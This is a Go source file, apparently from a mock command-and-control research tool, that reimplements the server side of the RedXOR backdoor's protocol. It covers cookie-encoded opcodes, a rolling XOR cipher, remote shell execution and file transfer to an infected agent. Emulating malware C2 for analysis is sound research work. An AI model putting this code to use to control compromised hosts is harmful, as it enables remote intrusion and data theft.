package redxor

import (
	"bufio"
	"crypto/sha256"	
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"strconv"

	"github.com/carbonblack/mockc2/internal/log"
	"github.com/carbonblack/mockc2/pkg/protocol"
)

const (
	opHostInfo     = "0000"
	opHostInfoResp = "0001"
	opDownload     = "2054"	
	opUploadStart  = "2055"
	opUploadData   = "2066"
	opDownloadDone = "2088"
	opShellStart   = "3000"
	opShellExec    = "3058"
	opShellStop    = "3999"
)

// Handler is a RedXOR protocol handler.
type Handler struct {
	delegate        protocol.Delegate
	pr              *io.PipeReader
	pw              *io.PipeWriter
	b               *bufio.Reader
	shellStarted    bool
	source          string
	destination     string
	file            *os.File
	fileSize        int64
}

// SetDelegate saves the delegate for later use.
func (h *Handler) SetDelegate(delegate protocol.Delegate) {
	h.delegate = delegate
}

// Accept gives the Handler a chance to do something as soon as an agent
// connects.
func (h *Handler) Accept() {
}

// ReceiveData just logs information about data received.
func (h *Handler) ReceiveData(data []byte) {
	log.Debug("received\n" + hex.Dump(data))

	if h.b == nil {
		h.pr, h.pw = io.Pipe()
		h.b = bufio.NewReader(h.pr)
		go h.processData()
	}

	h.pw.Write(data)
}

func (h *Handler) processData() {
	for {
		req, err := http.ReadRequest(h.b)
		if err != nil && err != io.EOF {
			log.Warn("redxor error reading request: %v", err)
		}

		if err == io.EOF {
			break
		}

		if req != nil {
			contentLength := req.Header.Get("Content-Length")
			totalLength := req.Header.Get("Total-Length")

			cookie, err := req.Cookie("JSESSIONID")
			if err != nil {
    			h.delegate.CloseConnection()
				return
			}

			log.Debug("JSESSIONID: %s\nContent-Length: %s\nTotal-Length: %s", cookie.Value, contentLength, totalLength)

			body, err := ioutil.ReadAll(req.Body)
			if err != nil {
    			h.delegate.CloseConnection()
				return
			}

			key, err := strconv.Atoi(contentLength)
			if err != nil {
    			h.delegate.CloseConnection()
				return
			}

			adder, err := strconv.Atoi(totalLength)
			if err != nil {
    			h.delegate.CloseConnection()
				return
			}

			body = cipher(body, uint8(key), uint8(adder))

			log.Debug("body\n" + hex.Dump(body))

			switch cookie.Value {
			case opHostInfo:
				h.sendCommand(opHostInfo, 9, 9, []byte("all right"))
			case opHostInfoResp:
				hash := sha256.Sum256(body)
				id := hex.EncodeToString(hash[:])
				h.delegate.AgentConnected(id)
			case opShellExec:
				log.Info(string(body))
			case opDownload:
				h.file.Write(body)
			case opDownloadDone:
				if h.file != nil {
					h.file.Close()
				}
			
				h.file = nil
				h.fileSize = 0
				h.source = ""
				h.destination = ""

				log.Success("Download complete")
			case opUploadStart:
				buf := make([]byte, 0x1000)
				for {
					bytesRead, err := h.file.Read(buf)

					if err != nil {
						if err != io.EOF {
							log.Warn("Error reading source file; %v", err)
						}
						break
					}

					h.sendCommand(opUploadData, bytesRead, int(h.fileSize), buf[:bytesRead])
				}

				if h.file != nil {
					h.file.Close()
				}
			
				h.file = nil
				h.fileSize = 0
				h.source = ""
				h.destination = ""

				log.Success("Upload complete")
			}
		}
	}
}

// Execute runs a command on the connected agent.
func (h *Handler) Execute(name string, args []string) {
	if !h.shellStarted {
		h.sendCommand(opShellStart, 0, 0, []byte{})
		h.shellStarted = true
	}

	commandLine := strings.TrimSpace(name + " " + strings.Join(args, " "))		
	h.sendCommand(opShellExec, len(commandLine), len(commandLine), []byte(commandLine))
}

// Upload sends a file to the connected agent.
func (h *Handler) Upload(source string, destination string) {
	file, err := os.Open(source)
	if err != nil {
		log.Warn("Error opening source file: %v", err)
		return
	}

	fi, err := file.Stat()
	if err != nil {
		log.Warn("Error opening source file: %v", err)
		return
	}
	
	h.file = file
	h.fileSize = fi.Size()
	h.source = source
	h.destination = destination

	data := []byte(destination+"#0")
	h.sendCommand(opUploadStart, len(data), len(data), data)
}

// Download retrieves a file from the connected agent.
func (h *Handler) Download(source string, destination string) {
	file, err := os.Create(destination)
	if err != nil {
		log.Warn("Error opening destination file: %v", err)
		return
	}

	h.file = file
	h.source = source
	h.destination = destination

	data := []byte(source+"#0")
	h.sendCommand(opDownload, len(data), len(data), data)
}

// Close cleans up any uzed resources
func (h *Handler) Close() {
	h.sendCommand(opShellStop, 0, 0, []byte{})
	h.shellStarted = false
	h.pw.Close()
}

// NeedsTLS returns whether the protocol runs over TLS or not.
func (h *Handler) NeedsTLS() bool {
	return false
}

func (h *Handler) sendCommand(opcode string, contentLength int, totalLength int, data []byte) {
	encrypted := cipher(data, uint8(contentLength), uint8(totalLength))

	headerFormat :=
		"HTTP/1.1 200 OK\r\n" +
		"Set-Cookie: JSESSIONID=%s\r\n" +
		"Content-Type: text/html\r\n" +
		"Content-Length: %010d\r\n" +
		"Total-Length: %010d\r\n" +
		"\r\n"

	header := fmt.Sprintf(headerFormat, opcode, contentLength, totalLength)

	h.delegate.SendData([]byte(header))
	h.delegate.SendData(encrypted)
}

func cipher(input []byte, key uint8, adder uint8) []byte {
	output := make([]byte, len(input))

	for i := 0; i < len(input); i++ {
		output[i] = input[i] ^ key
		key += adder
	}

	return output
}
